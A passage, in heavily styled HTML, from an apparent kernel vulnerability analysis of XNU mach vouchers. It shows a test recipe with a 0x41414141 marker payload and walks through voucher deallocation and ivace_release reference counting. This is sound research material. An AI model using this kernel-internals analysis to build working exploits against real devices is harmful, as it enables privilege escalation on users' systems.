 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">r</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">recipe</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">command </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">r</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">recipe</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">content_size </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">sizeof</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">uint32_t</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">r</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">payload </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">0x41414141</span><span class="BGLtzooHlW-c2">;</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">This will end up with the following data structures in the kernel:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.1c923ba263ede6be48f5e3994bd28dbf63e17419"></a><a id="t.39"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">voucher_port </span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; ip_kobject </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;reference</span><span class="BGLtzooHlW-c2">-</span><span class="BGLtzooHlW-c3">counted pointer to the voucher</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">voucher </span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; iv_refs </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; iv_table</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c15">6</span><span class="BGLtzooHlW-c2">]</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;reference</span><span class="BGLtzooHlW-c2">-</span><span class="BGLtzooHlW-c4">counted </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">index</span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">into</span><span class="BGLtzooHlW-c3">&nbsp;user_data controller&#39;s ivac_table</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">controller </span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; ivace_table</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">index</span><span class="BGLtzooHlW-c2">]</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">=</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; ivace_refs </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; ivace_made </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; ivace_value </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c3">&nbsp;pointer to user_data_value_element</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">user_data_value_element </span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; e_made </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; e_data</span><span class="BGLtzooHlW-c2">[]</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span><span class="BGLtzooHlW-c15">0x41</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">0x41</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">0x41</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">0x41</span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">Let&#39;s look at what happens when we drop the only send right to the voucher port and the voucher gets deallocated.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>We&#39;ll skip analysis of the mach port part; essentially, once all the send rights to the mach port holding a reference to the voucher are deallocated </span><span class="BGLtzooHlW-c11">iv_release</span><span>&nbsp;will get called to drop its reference on the voucher. And if that was the last reference </span><span class="BGLtzooHlW-c11">iv_release</span><span>&nbsp;calls </span><span class="BGLtzooHlW-c11">iv_dealloc</span><span class="BGLtzooHlW-c10">&nbsp;and we&#39;ll pick up the code there:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.4b28abaa66e9cfb4075064152109c5280c8cf0e2"></a><a id="t.40"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">void</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">iv_dealloc</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ipc_voucher_t iv</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;boolean_t unhash</span><span class="BGLtzooHlW-c2">)</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">iv_dealloc</span><span>&nbsp;removes the voucher from the hash table, destroys the mach port associated with the voucher (if there was one) then releases a reference on each value index in the </span><span class="BGLtzooHlW-c11">iv_table</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.4f3ea1be5aeabd748f89b7dfdb88c89a35820b48"></a><a id="t.41"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">for</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">i </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp;i </span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;iv</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">iv_table_size</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp;i</span><span class="BGLtzooHlW-c2">++)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivace_release</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">i</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;iv</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">iv_table</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">i</span><span class="BGLtzooHlW-c2">]);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Recall that the index in the </span><span class="BGLtzooHlW-c11">iv_table</span><span>&nbsp;is the &quot;key index&quot;, which is one less than the key, which is why </span><span class="BGLtzooHlW-c11">i</span><span>&nbsp;is being passed to </span><span class="BGLtzooHlW-c11">ivace_release</span><span>. The value in </span><span class="BGLtzooHlW-c11">iv_table</span><span>&nbsp;alone is meaningless without knowing under which index it was stored in the </span><span class="BGLtzooHlW-c11">iv_table</span><span>. Here&#39;s the start of </span><span class="BGLtzooHlW-c11">ivace_release</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.3340385800b70e69984ecec61cc53f34e8b57d23"></a><a id="t.42"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">static</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">void</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">ivace_release</span><span class="BGLtzooHlW-c2">(</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; iv_index_t key_index</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; iv_index_t value_index</span><span class="BGLtzooHlW-c2">)</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">...</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivgt_lookup</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">key_index</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;FALSE</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">ivam</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivac_lock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">value_index </span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;ivac</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivac_table_size</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivace </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivac_table</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">value_index</span><span class="BGLtzooHlW-c2">];</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_refs</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* cant release persistent values */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_persist</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivac_unlock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">--</span><span class="BGLtzooHlW-c4">ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_refs</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivac_unlock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>First they grab references to the attribute manager and controller for the given key index (</span><span class="BGLtzooHlW-c11">ivam</span><span>&nbsp;and </span><span class="BGLtzooHlW-c11">ivac</span><span>), take the </span><span class="BGLtzooHlW-c11">ivac</span><span>&nbsp;lock then take calculate a pointer into the </span><span class="BGLtzooHlW-c11">ivac</span><span>&#39;s </span><span class="BGLtzooHlW-c11">ivac_table</span><span>&nbsp;to get a pointer to the </span><span class="BGLtzooHlW-c11">ivac_entry</span><span>&nbsp;corresponding to the </span><span class="BGLtzooHlW-c11">value_index</span><span class="BGLtzooHlW-c10">&nbsp;to be released.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>If this entry is marked as persistent, then nothing happens, otherwise the </span><span class="BGLtzooHlW-c11">ivace_refs</span><span>&nbsp;field is decremented. If the reference count is still non-zero, they drop the </span><span class="BGLtzooHlW-c11">ivac</span><span>&#39;s lock and return. Otherwise, the reference count of this </span><span class="BGLtzooHlW-c11">ivac_entry</span><span>&nbsp;has gone to zero and they will continue on to &quot;free&quot; the </span><span class="BGLtzooHlW-c11">ivac_entry</span><span>. As noted before, this isn&#39;t going to free the </span><span class="BGLtzooHlW-c11">ivac_entry</span><span class="BGLtzooHlW-c10">&nbsp;to the zone allocator; the entry is just an entry in an array and in its free state its index is present in a freelist of empty indexes. The code continues thus:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.3548b2c452dd7eb3579b0290670f339199044845"></a><a id="t.43"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; key </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;iv_index_to_key</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">key_index</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">MACH_VOUCHER_ATTR_KEY_NONE </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;key</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/*</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* if last return reply is still pending,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* let it handle this later return when</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* the previous reply comes in.</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_releasing</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivac_unlock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* claim releasing */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_releasing </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;TRUE</span><span class="BGLtzooHlW-c2">;</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">iv_index_to_key</span><span>&nbsp;goes back from the </span><span class="BGLtzooHlW-c11">key_index</span><span>&nbsp;to the key value (which in practice will be 1 greater than the key index.) Then the </span><span class="BGLtzooHlW-c11">ivace_entry</span><span class="BGLtzooHlW-c10">&nbsp;is marked as &quot;releasing&quot;. The code continues:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.2d8847df4f2d48c8c26863add2566524e8dbcae8"></a><a id="t.44"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; value </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_value</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">redrive</span><span class="BGLtzooHlW-c2">:</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">value </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_value</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(!</span><span class="BGLtzooHlW-c4">ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_free</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; made </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_made</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivac_unlock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* callout to manager&#39;s release_value */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; kr </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivam</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivam_release_value</span><span class="BGLtzooHlW-c2">)(</span><span class="BGLtzooHlW-c4">ivam</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;key</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;value</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;made</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* recalculate entry address as table may have changed */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivac_lock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
